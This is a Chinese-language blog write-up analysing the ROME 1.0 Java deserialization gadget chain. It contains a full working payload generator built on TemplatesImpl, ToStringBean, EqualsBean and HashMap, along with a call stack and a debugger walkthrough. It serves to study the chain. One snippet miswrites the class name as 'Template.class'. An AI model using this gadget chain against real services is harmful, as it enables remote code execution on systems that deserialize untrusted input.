# ROME 简介

ROME 是用于 RSS 和 Atom 订阅的 Java 框架。 并根据 Apache 2.0 许可证开源。

ROME 包括一组用于各种形式的联合供稿的解析器和生成器，以及用于从一种格式转换为另一种格式的转换器。 解析器可以为您提供特定于您要使用的格式的 Java
对象，或者为您提供通用的规范化 `SyndFeed` 类，该类使您可以处理数据而不必担心传入或传出的提要类型。

可以利用的类：`ToStringBean`，`EqualsBean`，`ObjectBean`。

# 环境搭建

pom.xml

    
    
    <dependency>  
        <groupId>rome</groupId>  
        <artifactId>rome</artifactId>  
        <version>1.0</version>  
    </dependency>
    

# 手写EXP

    
    
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.sun.syndication.feed.impl.EqualsBean;
    import com.sun.syndication.feed.impl.ToStringBean;
    
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.Base64;
    import java.util.HashMap;
    
    public class Test {
        public static void setFieldValue(Object object, String fieldName, Object value) throws Exception {
            Class clazz = object.getClass();
            Field field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        }
    
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ROME.bin"));
            oos.writeObject(obj);
        }
    
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
        public static void main(String[] args) throws Exception {
            //TemplatesImpl类
            byte[] code = Files.readAllBytes(Paths.get("E:\\JAVA\\ROME\\target\\classes\\Exp.class"));
            TemplatesImpl templates = new TemplatesImpl();
            TemplatesImpl templates1 = new TemplatesImpl();
            setFieldValue(templates, "_name", "aaa");
            setFieldValue(templates, "_bytecodes", new byte[][] {code});
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            //ToStringBean类
            ToStringBean toStringBean = new ToStringBean(templates.getClass(),templates1);
            //EqualsBean类
            EqualsBean equalsBean = new EqualsBean(toStringBean.getClass(), toStringBean);
            //HashMap类
            HashMap<Object, Object> hashMap = new HashMap<>();
            hashMap.put(equalsBean, "aaa");
            setFieldValue(toStringBean,"_beanClass",Templates.class);
            setFieldValue(toStringBean, "_obj", templates);
            serialize(hashMap);
            unserialize("ROME.bin");
        }
    }
    

# 调用栈

    
    
    getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:497, Method (java.lang.reflect)
    toString:137, ToStringBean (com.sun.syndication.feed.impl)
    toString:116, ToStringBean (com.sun.syndication.feed.impl)
    beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)
    hashCode:176, EqualsBean (com.sun.syndication.feed.impl)
    hash:338, HashMap (java.util)
    readObject:1397, HashMap (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:497, Method (java.lang.reflect)
    invokeReadObject:1058, ObjectStreamClass (java.io)
    readSerialData:1900, ObjectInputStream (java.io)
    readOrdinaryObject:1801, ObjectInputStream (java.io)
    readObject0:1351, ObjectInputStream (java.io)
    readObject:371, ObjectInputStream (java.io)
    unserialize:31, Test2
    main:52, Test2
    

# 漏洞分析

在反序列化的入口打个断点。

![](./img/7490506881583646177.png)

跟进到了`HashMap`下的`readObject`,我们知道`HashMap`会调用任意我们传入对象（把对象赋值给`key`）的`hashcode`方法。

![](./img/5817447722206072032.png)

![](./img/5163214559830492637.png)

所以可以跟进到`EqualsBean`的`HashCode`方法,而且方法体内部又会调用`beanHashcode`方法。

![](./img/6811441751647793144.png)

跟进`beanHashcode`方法，其内部会调用`_obj`对象的`toString`方法。

![](./img/8858903894931244644.png)

而我们是给`_obj`赋值的是`toStringBean`,所以会进入到`ToStringBean`类下的`toString`方法，而且是先触发`public`,然后触发`private`

![](./img/580561309608280663.png)

![](./img/7737350649012731361.png)

这里就到了最关键的一步，这里的代码逻辑是，可以获取`_beanClass`对象的所有的`getter`和`setter`方法，并且在满足`if`的代码逻辑之后，这里的
`pReadMethod.invoke()` 就类似于在反射中看的 `method.invoke()`
一样，所以可以执行`templates`对象的`getOutputProperties`方法。

最后调用到`TemplatesImpl`类下的`getOutputProperties`，实现恶意代码的触发。

![](./img/1524189383102427799.png)

# 注意点（手写EXP时）

    
    
    setFieldValue(toStringBean,"_beanClass",templates.getClass());
    setFieldValue(toStringBean, "_obj", templates);

为避免在`hashmap.put`的时候触发调用链，我们要先传入正常数据，然后再反射修改，但是在反射修改的时候有可能师傅们会遇到我这样的一个问题。就是在执行了这个方法之后，不再执行我们想执行的`getOutputProperties`方法了。

![](./img/1870226488901566083.png)

![](./img/4840139250932974847.png)

![](./img/4135827838263528802.png)  
我也没弄清楚为什么为会这样(希望师傅们指导)，但是还是找到了一个解决问题的方法。把上面的反射代码改为下面这个就可以了。

    
    
    setFieldValue(toStringBean,"_beanClass",Template.class);
    setFieldValue(toStringBean, "_obj", templates);
    

到时候它只会遍历Templates接口类，其下只有一个getter方法，而且正好是`getOutputProperties`方法。

![](./img/6693034450083316216.png)

# 总结

感觉在学完CC链之后看这些还是挺容易的，就是在手写EXP的时候还是会遇到各种各样的异常。是一名刚入门java安全的小白，感谢师傅们的指导。

